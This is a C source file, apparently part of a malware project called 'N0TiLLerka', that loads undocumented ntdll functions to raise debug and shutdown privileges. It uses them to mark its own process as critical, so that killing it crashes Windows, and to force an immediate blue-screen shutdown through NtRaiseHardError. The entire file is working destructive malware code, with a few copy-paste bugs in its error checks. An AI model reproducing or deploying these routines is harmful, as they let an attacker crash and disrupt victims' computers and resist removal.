#include "../../HeaderFiles/N0TiLLerka.h"
#ifndef DISABLE_NT_FUNCTIONS

// NT Macros
#define OPTION_SHUTDOWN_SYSTEM 6
#define SE_SHUTDOWN_PRIVILEGE 19
#define SE_DEBUG_PRIVILEGE 20

// NT/RTL Function Prototypes
typedef NTSTATUS(NTAPI* pRTLADJUSTPRIVILEGE)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
pRTLADJUSTPRIVILEGE RtlAdjustPrivilege;
typedef NTSTATUS(STDAPIVCALLTYPE* pRTLSETPROCESSISCRITICAL)(BOOLEAN, PBOOLEAN, BOOLEAN);
pRTLSETPROCESSISCRITICAL RtlSetProcessIsCritical;
typedef NTSTATUS(NTAPI* pNTRAISEHARDERROR)(NTSTATUS, ULONG, ULONG, PVOID*, ULONG, PUINT);
pNTRAISEHARDERROR NtRaiseHardError;

BOOL ImportNTDLLFunctions(VOID) {
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (hNtdll) {
		RtlAdjustPrivilege = (pRTLADJUSTPRIVILEGE)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		if (!RtlAdjustPrivilege) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"\"RtlAdjustPrivilege\" is invalid", L"GetProcAddress", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			FreeLibrary(hNtdll);
			return FALSE;
		}

		RtlSetProcessIsCritical = (pRTLSETPROCESSISCRITICAL)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
		if (!RtlSetProcessIsCritical) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"\"RtlSetProcessIsCritical\" is invalid", L"GetProcAddress", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			FreeLibrary(hNtdll);
			return FALSE;
		}

		NtRaiseHardError = (pNTRAISEHARDERROR)GetProcAddress(hNtdll, "NtRaiseHardError");
		if (!RtlAdjustPrivilege) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"\"NtRaiseHardError\" is invalid", L"GetProcAddress", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			FreeLibrary(hNtdll);
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't load \"ntdll.dll\"", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}

	return TRUE;
}

BOOL NTSetProcessIsCritical(BOOLEAN blIscritical) {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl)) {
		if (!RtlSetProcessIsCritical(blIscritical, NULL, FALSE)) {
			return TRUE;
		} else {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Couldn't set Process Critical", L"RtlSetProcessIsCritical", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't set Debug Privileges", L"RtlAdjustPrivilege", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}

	return FALSE;
}

BOOL NTRaiseHardError(VOID) {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bl)) {
		UINT ui;
		if (NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, OPTION_SHUTDOWN_SYSTEM, &ui)) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Failed to raise HardError", L"NtRaiseHardError", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't set Shutdwon Privileges", L"RtlAdjustPrivilege", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}
}
#endif // !DISABLE_NT_FUNCTIONS